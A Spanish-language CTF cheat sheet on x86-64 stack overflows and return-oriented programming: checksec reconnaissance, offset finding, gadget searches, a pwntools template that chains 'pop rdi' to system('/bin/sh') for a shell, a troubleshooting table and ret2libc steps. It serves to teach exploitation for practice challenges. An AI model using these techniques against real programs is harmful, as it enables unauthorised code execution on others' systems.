# Desbordamiento de pila y ROP en x86-64

[🇬🇧 English](rop-stack.en.md) | **Español**

Nota de referencia para retos de Pwn: cómo pasar de un `read()` sin límites a una shell, y qué hace fallar la cadena cuando ya parece correcta.

## 1. Reconocimiento

```bash
file ./challenge
checksec --file=./challenge
readelf -hW ./challenge | grep Type
```

| Protección | Qué implica |
|---|---|
| NX | no se puede ejecutar la pila → ROP o `mprotect` |
| PIE | direcciones aleatorias → hace falta un leak |
| Canary | detecta el overwrite antes del `ret` → hay que filtrarlo |
| RELRO | GOT de solo lectura si es *full* |
| Fortify | `read`/`memcpy` con comprobación de tamaño |

## 2. Offset exacto

```bash
python3 - <<'PY'
from pwn import *
print(cyclic(300).decode())
PY
```

Se envía el patrón, se lee `RIP` en el crash y se busca:

```bash
python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
```

Con `gdb` + `pwndbg`: `pattern create 300`, `pattern offset $rsp`. En un `scanf("%s")` el offset es el tamaño del buffer + 8 (RBP guardado).

## 3. Gadgets y funciones

```bash
ROPgadget --binary ./challenge | grep -E "pop rdi|pop rsi|syscall|leave"
objdump -d ./challenge | grep -E "<(system|execve|win)@plt>"
strings -a -t x ./challenge | grep "/bin/sh"
```

- `system("/bin/sh")`: `pop rdi; ret` + dirección de la cadena + `system@plt`.
- `execve("/bin/sh", 0, 0)`: `pop rdi`, `pop rsi`, `pop rdx` y `syscall`.
- Sin `/bin/sh`: escribirla en `.bss` con `read`/`gets` y volver a llamar.

## 4. Plantilla

```python
from pwn import *
context.binary = elf = ELF('./challenge')
context.log_level = 'debug'

OFF = <offset>
POP_RDI = <gadget>
RET = <gadget ret>          # alineación

def exploit(p):
    payload  = b'A' * OFF
    payload += p64(RET)      # alinea la pila a 16 bytes
    payload += p64(POP_RDI) + p64(next(elf.search(b'/bin/sh')))
    payload += p64(elf.plt['system'])
    p.sendlineafter(b'> ', payload)

p = process('./challenge')
exploit(p)
p.interactive()
```

## 5. Cuando falla

| Síntoma | Causa probable |
|---|---|
| `SIGSEGV` antes del `ret` | offset incorrecto o canario |
| `system` cae en `do_system` | pila desalineada: añade un `ret` |
| `system` no imprime nada | el proceso cierra stdin; usa `cat flag` o `sh -c` |
| Funciona en local, no en remoto | libc distinta: usa la libc del reto |
| `Bad address` en `execve` | `rsi`/`rdx` con basura: ponlos a 0 |

## 6. Sin `pop rdi`

- `__libc_csu_init` para encadenar registros.
- `ret2dlresolve` cuando no hay `system@plt` ni leak.
- `SROP` con `sigreturn` si controlas `rax`.
- Format string (`%n`) para escribir la GOT si el binario la tiene escribible.

## 7. Ret2libc con leak

1. Filtrar `puts@got` con `pop rdi; ret`.
2. Volver a `main` para un segundo payload.
3. Calcular la base de libc: `leak - libc.symbols['puts']`.
4. Segundo payload: `system` + `/bin/sh` de la libc.

## Lecciones

- Mide el offset siempre; el 90 % de los fallos viene de ahí o de la alineación.
- Si el binario no tiene PIE, el reto es más corto: gadgets fijos y `plt`.
- Documenta la versión de libc del reto; sin ella el exploit no es reproducible.

MITRE: T1203, T1059.004.
